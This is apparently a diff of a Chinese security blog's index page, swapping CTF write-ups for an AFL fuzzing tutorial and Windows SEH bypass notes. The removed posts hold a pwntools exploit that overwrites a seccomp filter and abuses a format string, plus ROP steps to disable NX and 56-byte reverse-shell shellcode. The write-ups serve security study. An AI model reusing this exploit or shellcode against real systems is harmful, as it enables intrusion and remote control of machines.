@@ -62,96 +62,51 @@
     <header>
       
         <div class="icon"></div>
-        <time datetime="2018-07-07T07:58:18.000Z"><a href="/2018/07/07/bpf/">2018-07-07</a></time>
+        <time datetime="2018-07-07T07:58:18.000Z"><a href="/2018/07/07/afl/">2018-07-07</a></time>
       
       
   
-    <h1 class="title"><a href="/2018/07/07/bpf/">bpf</a></h1>
-  
-
-    </header>
-    <div class="entry">
-      
-        <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">show_flag</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  ...</span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">0x40</span>);</span><br><span class="line">  fd = open(<span class="string">"flag.txt"</span>, <span class="number">0x80000</span>);</span><br><span class="line">  read(fd, buf, <span class="number">0x40</span>);</span><br><span class="line">  write(<span class="number">1</span>, buf, <span class="number">0x40</span>);</span><br><span class="line">  close(fd);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v18[<span class="number">32</span>];</span><br><span class="line">  <span class="keyword">short</span> v19;</span><br><span class="line">  ...</span><br><span class="line">  <span class="keyword">char</span>* secret;</span><br><span class="line">  <span class="keyword">int</span> i;</span><br><span class="line">  <span class="keyword">int</span> j;</span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">  sercet = <span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line">  <span class="keyword">if</span> (!secret)</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  fd = open(<span class="string">"secret.txt"</span>, <span class="number">0x80000</span>);</span><br><span class="line">  <span class="keyword">if</span> (fd == <span class="number">-1</span>)</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  v8 = read(fd, secret, <span class="number">0x40</span>);</span><br><span class="line">  <span class="keyword">if</span> (v8 == <span class="number">-1</span>)</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  secret[v8] = <span class="number">0</span>;</span><br><span class="line">  close(fd);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//seccomp BPF</span></span><br><span class="line">  v19 = <span class="number">32</span>;</span><br><span class="line">  v20 = <span class="number">0</span>;</span><br><span class="line">  v21 = <span class="number">0</span>;</span><br><span class="line">  v22 = <span class="number">4</span>;</span><br><span class="line">  v23 = <span class="number">21</span>;</span><br><span class="line">  v24 = <span class="number">1</span>;</span><br><span class="line">  v25 = <span class="number">0</span>;</span><br><span class="line">  v26 = <span class="number">-1073741762</span>;</span><br><span class="line">  v27 = <span class="number">6</span>;</span><br><span class="line">  v28 = <span class="number">0</span>;</span><br><span class="line">  v29 = <span class="number">0</span>;</span><br><span class="line">  v30 = <span class="number">0</span>;</span><br><span class="line">  v31 = <span class="number">32</span>;</span><br><span class="line">  v32 = <span class="number">0</span>;</span><br><span class="line">  v33 = <span class="number">0</span>;</span><br><span class="line">  v34 = <span class="number">0</span>;</span><br><span class="line">  v35 = <span class="number">21</span>;</span><br><span class="line">  v36 = <span class="number">0</span>;</span><br><span class="line">  v37 = <span class="number">1</span>;</span><br><span class="line">  v38 = <span class="number">231</span>;</span><br><span class="line">  v39 = <span class="number">6</span>;</span><br><span class="line">  v40 = <span class="number">0</span>;</span><br><span class="line">  v41 = <span class="number">0</span>;</span><br><span class="line">  v42 = <span class="number">2147418112</span>;</span><br><span class="line">  v43 = <span class="number">21</span>;</span><br><span class="line">  v44 = <span class="number">0</span>;</span><br><span class="line">  v45 = <span class="number">1</span>;</span><br><span class="line">  v46 = <span class="number">0</span>;</span><br><span class="line">  v47 = <span class="number">6</span>;</span><br><span class="line">  v48 = <span class="number">0</span>;</span><br><span class="line">  v49 = <span class="number">0</span>;</span><br><span class="line">  v50 = <span class="number">2147418112</span>;</span><br><span class="line">  v51 = <span class="number">21</span>;</span><br><span class="line">  v52 = <span class="number">0</span>;</span><br><span class="line">  v53 = <span class="number">1</span>;</span><br><span class="line">  v54 = <span class="number">2</span>;</span><br><span class="line">  v55 = <span class="number">6</span>;</span><br><span class="line">  v56 = <span class="number">0</span>;</span><br><span class="line">  v57 = <span class="number">0</span>;</span><br><span class="line">  v58 = <span class="number">2147418112</span>;</span><br><span class="line">  v59 = <span class="number">21</span>;</span><br><span class="line">  v60 = <span class="number">0</span>;</span><br><span class="line">  v61 = <span class="number">1</span>;</span><br><span class="line">  v62 = <span class="number">1</span>;</span><br><span class="line">  v63 = <span class="number">6</span>;</span><br><span class="line">  v64 = <span class="number">0</span>;</span><br><span class="line">  v65 = <span class="number">0</span>;</span><br><span class="line">  v66 = <span class="number">2147418112</span>;</span><br><span class="line">  v67 = <span class="number">21</span>;</span><br><span class="line">  v68 = <span class="number">0</span>;</span><br><span class="line">  v69 = <span class="number">1</span>;</span><br><span class="line">  v70 = <span class="number">3</span>;</span><br><span class="line">  v71 = <span class="number">6</span>;</span><br><span class="line">  v72 = <span class="number">0</span>;</span><br><span class="line">  v73 = <span class="number">0</span>;</span><br><span class="line">  v74 = <span class="number">2147418112</span>;</span><br><span class="line">  v75 = <span class="number">6</span>;</span><br><span class="line">  v76 = <span class="number">0</span>;</span><br><span class="line">  v77 = <span class="number">0</span>;</span><br><span class="line">  v78 = <span class="number">0</span>;</span><br><span class="line">  v16 = <span class="number">15</span>;</span><br><span class="line">  v17 = &amp;v19;</span><br><span class="line">  </span><br><span class="line">  seccomp_setup = <span class="number">0</span>;</span><br><span class="line">  v15 = &amp;v16;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (i=<span class="number">16</span>;i&gt;<span class="number">0</span>;i--) &#123;</span><br><span class="line">    v18[syscall(<span class="number">0</span>, <span class="number">0</span>, v18, <span class="number">96</span>)] = <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> (!seccomp_setup) &#123;</span><br><span class="line">      <span class="keyword">if</span> (prctl(PR_SET_NO_NEW_PRIVS, <span class="number">0x1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">      <span class="keyword">if</span> (prctl(PR_SET_SECCOMP, <span class="number">0x2</span>, v15))</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    v11 = <span class="built_in">strlen</span>(secret) + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (j=<span class="number">0</span>; ;j++) &#123;</span><br><span class="line">      <span class="keyword">if</span> (v11 - <span class="number">1</span> == j)</span><br><span class="line">        <span class="keyword">goto</span> LABEL_SHOW_FLAG;</span><br><span class="line">      <span class="keyword">if</span> (secret[j] != v18[j])</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Wrong secret :/"</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strlen</span>(secret) == j)</span><br><span class="line">LABEL_SHOW_FLAG:</span><br><span class="line">      show_flag();</span><br><span class="line"></span><br><span class="line">    _fprintf_chk(<span class="built_in">stderr</span>, <span class="number">1</span>, v18);</span><br><span class="line">    seccomp_setup = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<pre><code>所以，二进制文件加载“secret.txt”，
-如果我们发送正确的秘密，我们将会得到该标志的奖励。
-我在工作目录中创建了“secret.txt”和“flag.txt”，
-并在执行二进制文件时发现存在格式字符串漏洞。
-我们可以用“％p％p％s”泄漏正确的秘密，
-因为指向秘密的指针位于堆栈中。不那么容易:)格式字符串存在，
-但输出打印到stderr。因此，不可能将其远程泄漏。
-另外,启用FORTIFY_SOURCE可防止使用%n可写内存段。
-您可能注意到SECCOMP过滤器正在堆栈中初始化。
-我在运行时转储它并使用seccomp-tools反汇编规则
-</code></pre><h1 id="bpf分析"><a href="#bpf分析" class="headerlink" title="bpf分析"></a>bpf分析</h1><pre><code>exit_group，read，open，write和close被启用。
-然后，我注意到程序在缓冲区中读取了96个字符，其大小为32.在应用规则之前，我们可以在第一次读取时将缓冲区溢出到SECCOMP BPF中。我们只能写一个新的BPF，
-只有64个字节。编写一个新的过滤器很容易，
-它允许每个系统调用，但是这对我们无能为力。
-
-当开始跟踪系统调用时%n，printf_chk它会打开“/ self / proc / maps”
-以检查缓冲区是否位于可写段中。
-我们开始深入研究glibc源代码，
-并发现它：readonly-area.c。
-具体来说，我们需要打开return ENOENT
-或者EACCEScheck内部__readonly_area()
-通过并返回1，这是绕过%n过滤 所必需的。
-我们可以让SECCOMP返回一个任意的错误，
-而不用ERRNO执行系统调用 
-</code></pre><p>从Linux SECCOMP手册页：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SECCOMP_RET_ERRNO</span><br><span class="line">              This value results in the SECCOMP_RET_DATA portion of the fil‐</span><br><span class="line">              ter&apos;s return value being passed to user space as the errno</span><br><span class="line">              value without executing the system call.</span><br></pre></td></tr></table></figure>
-<p>我使用了这个过滤器，并将最低有效16位（由常量SECCOMP_RET_DATA定义）修补为ENOENT=0x2：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">A = sys_number</span><br><span class="line">A != open ? ok : next</span><br><span class="line">return ERRNO</span><br><span class="line">ok:</span><br><span class="line">return ALLOW</span><br></pre></td></tr></table></figure>
-<pre><code>%n正在工作！但还有一小步。之前的过滤器也会阻止open(&quot;flag.txt&quot;, 0x80000)系统调用。
-标志是相同的（0x80000），所以我们不能使用基于这个参数的过滤器。
-然而，无论PIE被启用，哪个随机化文本地址，
-我们知道“flag.txt”地址的最后一个字节是0x64 _rodata。
-</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">A = sys_number</span><br><span class="line">A != open ? ok : next</span><br><span class="line">A = args[0]</span><br><span class="line">A &amp;= 0xff</span><br><span class="line">A == 0x64 ? ok : next</span><br><span class="line">return ERRNO</span><br><span class="line">ok:</span><br><span class="line">return ALLOW</span><br></pre></td></tr></table></figure>
-<h1 id="编译方法-asm"><a href="#编译方法-asm" class="headerlink" title="编译方法 asm"></a>编译方法 asm</h1><p>我用seccomp-tools编译了这个过滤器，并将其用于我的漏洞利用：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">"./flag_store"</span>)</span><br><span class="line"><span class="comment">#r = remote("35.198.105.104", 10000)</span></span><br><span class="line"></span><br><span class="line">bpf = <span class="string">"20000000000000001500000402000000200000001000000054000000ff00000015000100640000000600000002000500060000000000ff7f"</span>.decode(<span class="string">"hex"</span>)</span><br><span class="line"></span><br><span class="line">r.send((<span class="string">"A"</span>*<span class="number">32</span> + bpf))</span><br><span class="line">r.recvuntil(<span class="string">"Wrong secret :/"</span>)</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">"%c%c%n"</span>)</span><br><span class="line">r.recvuntil(<span class="string">"Wrong secret :/"</span>)</span><br><span class="line"></span><br><span class="line">r.send(<span class="string">"\x02"</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></p>
-
-      
-    </div>
-    
-    <footer>
-        <div class="alignright">
-          
-          <a href='javascript:void(0)' class="share-link bdsharebuttonbox" data-cmd="more">分享</a>
-        </div>
-        
-        
-        <!-- partial('post/share') -->
-      <div class="clearfix"></div>
-    </footer>
-  </div>
-</article>
-
-
-
-
-
-  <article class="post">
-  
-  <div class="post-content">
-    <header>
-      
-        <div class="icon"></div>
-        <time datetime="2018-07-07T07:58:18.000Z"><a href="/2018/07/07/windows机制/">2018-07-07</a></time>
-      
-      
-  
-    <h1 class="title"><a href="/2018/07/07/windows机制/">windows机制</a></h1>
+    <h1 class="title"><a href="/2018/07/07/afl/">afl</a></h1>
   
 
     </header>
     <div class="entry">
       
-        <h2 id="seh机制"><a href="#seh机制" class="headerlink" title="seh机制"></a>seh机制</h2><pre><code>seh是异常处理程序在eip下方，为单向链表
-一直到最后一个函数
-sehsafe是windows后加的安全机制
-通过检测seh函数地址是否为预先设定的地址来防止溢出
-但 没开启sehsafe的函数 加载模块之外的地方 堆区均可无视sehsafe 
-可以利用这个特点进行绕过 
-sehop检测链表最后一个函数是不是默认处理函数可以伪造链表绕过
-</code></pre>
+        <p>afl-fuzz技术初探<br>目录</p>
+<p>安装lzma-sdk<br>安装ucl<br>安装zlib<br>编译upx</p>
+<p>正文</p>
+<p>afl-fuzz技术初探<br>转载请注明出处:<a href="http://www.cnblogs.com/WangAoBo/p/8280352.html" target="_blank" rel="noopener">http://www.cnblogs.com/WangAoBo/p/8280352.html</a></p>
+<p>参考了:</p>
+<p><a href="http://pwn4.fun/2017/09/21/AFL%E6%8A%80%E6%9C%AF%E4%BB%8B%E7%BB%8D/" target="_blank" rel="noopener">http://pwn4.fun/2017/09/21/AFL%E6%8A%80%E6%9C%AF%E4%BB%8B%E7%BB%8D/</a></p>
+<p><a href="http://blog.csdn.net/youkawa/article/details/45696317" target="_blank" rel="noopener">http://blog.csdn.net/youkawa/article/details/45696317</a></p>
+<p><a href="https://stfpeak.github.io/2017/06/12/AFL-Cautions/" target="_blank" rel="noopener">https://stfpeak.github.io/2017/06/12/AFL-Cautions/</a></p>
+<p><a href="http://blog.csdn.net/abcdyzhang/article/details/53487683" target="_blank" rel="noopener">http://blog.csdn.net/abcdyzhang/article/details/53487683</a></p>
+<h1 id="安装afl"><a href="#安装afl" class="headerlink" title="安装afl"></a>安装afl</h1><pre><code>下载最新源码
+解压并安装:
+</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash $make $sudo make all</span><br></pre></td></tr></table></figure>
+<h2 id="有源码的afl-fuzz"><a href="#有源码的afl-fuzz" class="headerlink" title="有源码的afl-fuzz"></a>有源码的afl-fuzz</h2><pre><code>这里以fuzz upx为例进行测试
+
+编译upx
+upx项目地址([*https://github.com/upx/upx*)
+因为afl会对有源码的程序进行重新编译,因此需要修改upx的Makefile
+</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$git clone https://github.com/upx/upx.git</span><br><span class="line">$cd upx</span><br><span class="line">$vim Makefile</span><br><span class="line">CC = /usr/local/bin/afl-gcc #添加此句</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$cd src</span><br><span class="line">$vim Makefile</span><br><span class="line">CXX    ?= /usr/local/bin/afl-g++ #将CXX改成afl-g++</span><br></pre></td></tr></table></figure>
+<h3 id="安装lzma-sdk"><a href="#安装lzma-sdk" class="headerlink" title="安装lzma-sdk"></a>安装lzma-sdk</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$git submodule update --init --recursive</span><br></pre></td></tr></table></figure>
+<h3 id="安装ucl"><a href="#安装ucl" class="headerlink" title="安装ucl"></a>安装ucl</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bash $cd ucl-1.03 $./configure $make $sudo make install</span><br><span class="line">bash $export UPX_UCCLDIR=&quot;~/ucl-1.03&quot;</span><br></pre></td></tr></table></figure>
+<h3 id="安装zlib"><a href="#安装zlib" class="headerlink" title="安装zlib"></a>安装zlib</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$wget http://pkgs.fedoraproject.org/repo/pkgs/zlib/zlib-1.2.11.tar.xz/sha512/b7f50ada138c7f93eb7eb1631efccd1d9f03a5e77b6c13c8b757017b2d462e19d2d3e01c50fad60a4ae1bc86d431f6f94c72c11ff410c25121e571953017cb67/zlib-1.2.11.tar.xz</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$cd zlib-1.2.11/</span><br><span class="line">$./configure</span><br><span class="line">$sudo make install</span><br></pre></td></tr></table></figure>
+<h3 id="编译upx"><a href="#编译upx" class="headerlink" title="编译upx"></a>编译upx</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$cd ~/upx</span><br><span class="line">$make all</span><br></pre></td></tr></table></figure>
+<p>此时可在/src目录下找到upx.out文件<br>对upx进行fuzz测试</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$cd ~</span><br><span class="line">$mkdir afl_in afl_out</span><br></pre></td></tr></table></figure>
+<p>afl_in存放测试用例,afl_out存放fuzz结果<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$cp /usr/bin/file afl_in</span><br><span class="line">$afl-fuzz -i afl_in -o afl_out ~/upx/src/upx.out @@</span><br></pre></td></tr></table></figure></p>
+<p>@@会代替测试样本,即相当于执行了upx.out file</p>
+<p>对于从stdin获取输入的程序,可以使用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># afl-fuzz -i afl_in -o afl_out ./file</span><br></pre></td></tr></table></figure></p>
+<h2 id="无源码的afl-fuzz"><a href="#无源码的afl-fuzz" class="headerlink" title="无源码的afl-fuzz"></a>无源码的afl-fuzz</h2><pre><code>对无源码的程序进行fuzz一般有两种方法:
+对二进制文件进行插桩
+使用-n选项进行传统的fuzz测试
+这里主要介绍第一种,该方法是通过afl-qemu实现的.
+</code></pre><p>编译afl版的qemu<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ cd qemu_mode </span><br><span class="line">$ ./build_qemu_support.sh</span><br></pre></td></tr></table></figure></p>
+<p>另外需要把afl加入环境变量<br>例如：编辑/etc/profile文件，添加CLASSPATH变量<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># vi /etc/profile </span><br><span class="line">export CLASSPATH=./JAVA_HOME/lib;$JAVA_HOME/jre/lib</span><br></pre></td></tr></table></figure></p>
+<h3 id="对readelf进行fuzz"><a href="#对readelf进行fuzz" class="headerlink" title="对readelf进行fuzz"></a>对readelf进行fuzz</h3><p>以readelf为例<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$mkdir afl_in afl_out</span><br><span class="line">$cp test afl_in</span><br><span class="line">test为自己准备的测试elf</span><br><span class="line">$sudo cp /usr/bin/readelf .</span><br><span class="line">$afl_fuzz -i afl_in -o afl_out -Q readelf -a @@</span><br></pre></td></tr></table></figure></p>
+
       
     </div>
     
@@ -342,50 +297,91 @@ for i in range(1, 80):
     <header>
       
         <div class="icon"></div>
-        <time datetime="2018-07-07T07:58:18.000Z"><a href="/2018/07/07/关闭nx与反弹shell/">2018-07-07</a></time>
+        <time datetime="2018-07-07T07:58:18.000Z"><a href="/2018/07/07/windows机制/">2018-07-07</a></time>
       
       
   
-    <h1 class="title"><a href="/2018/07/07/关闭nx与反弹shell/">关闭nx与反弹shell</a></h1>
+    <h1 class="title"><a href="/2018/07/07/windows机制/">windows机制</a></h1>
   
 
     </header>
     <div class="entry">
       
-        <h1 id="程式描述"><a href="#程式描述" class="headerlink" title="程式描述"></a>程式描述</h1><pre><code>本題程式為statically linked，
-在本題中明顯提供解題者一個stack buffer overflow的漏洞，
-但因為程式有NX保護，必須使用ROP來控制程式行為。
-在寫入的第12byte後開始覆蓋main的return address，
-共計有88 bytes的overflow空間。
-在程式read完以後便切斷該程式對client的連線，
-即使拿到shell也無法操控該shell。
-</code></pre><h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><pre><code>較簡單的解決辦法為建立一個reverse shell，
-但如果全部只使用ROP最多只能放入22個gadgets
-（包括argument與padding等等）。
-所幸程式中可以找到_dl_make_stack_executable這個function以幫助解除NX保護，
-接著便可以shellcode來產生一個reverse shell。
-</code></pre><h1 id="解除stack的NX保護"><a href="#解除stack的NX保護" class="headerlink" title="解除stack的NX保護"></a>解除stack的NX保護</h1><pre><code>將__stack_prot設為7。
-將__libc_stack_end的address放入eax中。
-调用_dl_make_stack_executable。
-解除NX後使用call esp的gadget來執行接著放在stack中的shellcode，截至目前為止最少共需占用8格stack，也就是32 bytes。
+        <h2 id="seh机制"><a href="#seh机制" class="headerlink" title="seh机制"></a>seh机制</h2><pre><code>seh是异常处理程序在eip下方，为单向链表
+一直到最后一个函数
+sehsafe是windows后加的安全机制
+通过检测seh函数地址是否为预先设定的地址来防止溢出
+但 没开启sehsafe的函数 加载模块之外的地方 堆区均可无视sehsafe 
+可以利用这个特点进行绕过 
+sehop检测链表最后一个函数是不是默认处理函数可以伪造链表绕过
+</code></pre>
+      
+    </div>
+    
+    <footer>
+        <div class="alignright">
+          
+          <a href='javascript:void(0)' class="share-link bdsharebuttonbox" data-cmd="more">分享</a>
+        </div>
+        
+        
+        <!-- partial('post/share') -->
+      <div class="clearfix"></div>
+    </footer>
+  </div>
+</article>
 
-放入reverse shell的shellcode
-建立reverse shell須執行socket、dup2、connect、execve等指令，
-由於總共只有88 bytes的空間，且已用掉32 bytes來解除NX，
-剩下只能放入最多56 bytes的shellcode來完成reverse shell。但網路上所提供的shellcode最短也要將近70 bytes，距離需求的56 bytes仍有不少距離。以下是兩種解決辦法，在比賽時我們是使用第一種解法：
 
-想辦法硬縮，擠到56 bytes為止（我們使用的辦法）
-由於網路上提供的shellcode必須夠general以應付幾乎所有程式state，
-若能應用當時程式的某些state便可減少一點size。
-由於fd中0、1、2皆已被close，
-拿到的socket fd即已為0，因此只需進行一次dup2。
-由於ebp可控（ebp的值會等於input中的第8~11 byte），
-由此可以push ebp取代一次push 0xXXXXXXXX，省下4 bytes。
-push port時使用ax中已有的數值（0x66），
-port（big endian）將被固定為0x6600（26112）。
-</code></pre><p>此為最後所使用的shellcode（共56 bytes），其中IP位置須位於ebp當中、port固定為26112：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"> 0:   6a 01                   push   0x1</span><br><span class="line"> 2:   5b                      pop    ebx</span><br><span class="line"> 3:   99                      cdq</span><br><span class="line"> 4:   b0 66                   mov    al,0x66</span><br><span class="line"> 6:   52                      push   edx</span><br><span class="line"> 7:   53                      push   ebx</span><br><span class="line"> 8:   6a 02                   push   0x2</span><br><span class="line"> a:   89 e1                   mov    ecx,esp</span><br><span class="line"> c:   cd 80                   int    0x80</span><br><span class="line"> e:   5e                      pop    esi</span><br><span class="line"> f:   59                      pop    ecx</span><br><span class="line">10:   93                      xchg   ebx,eax</span><br><span class="line">11:   b0 3f                   mov    al,0x3f</span><br><span class="line">13:   cd 80                   int    0x80</span><br><span class="line">15:   b0 66                   mov    al,0x66</span><br><span class="line">17:   55                      push   ebp</span><br><span class="line">18:   66 50                   push   ax</span><br><span class="line">1a:   66 56                   push   si</span><br><span class="line">1c:   89 e1                   mov    ecx,esp</span><br><span class="line">1e:   0e                      push   cs</span><br><span class="line">1f:   51                      push   ecx</span><br><span class="line">20:   53                      push   ebx</span><br><span class="line">21:   89 e1                   mov    ecx,esp</span><br><span class="line">23:   b3 03                   mov    bl,0x3</span><br><span class="line">25:   cd 80                   int    0x80</span><br><span class="line">27:   b0 0b                   mov    al,0xb</span><br><span class="line">29:   59                      pop    ecx</span><br><span class="line">2a:   68 2f 73 68 00          push   0x68732f</span><br><span class="line">2f:   68 2f 62 69 6e          push   0x6e69622f</span><br><span class="line">34:   89 e3                   mov    ebx,esp</span><br><span class="line">36:   cd 80                   int    0x80</span><br></pre></td></tr></table></figure></p>
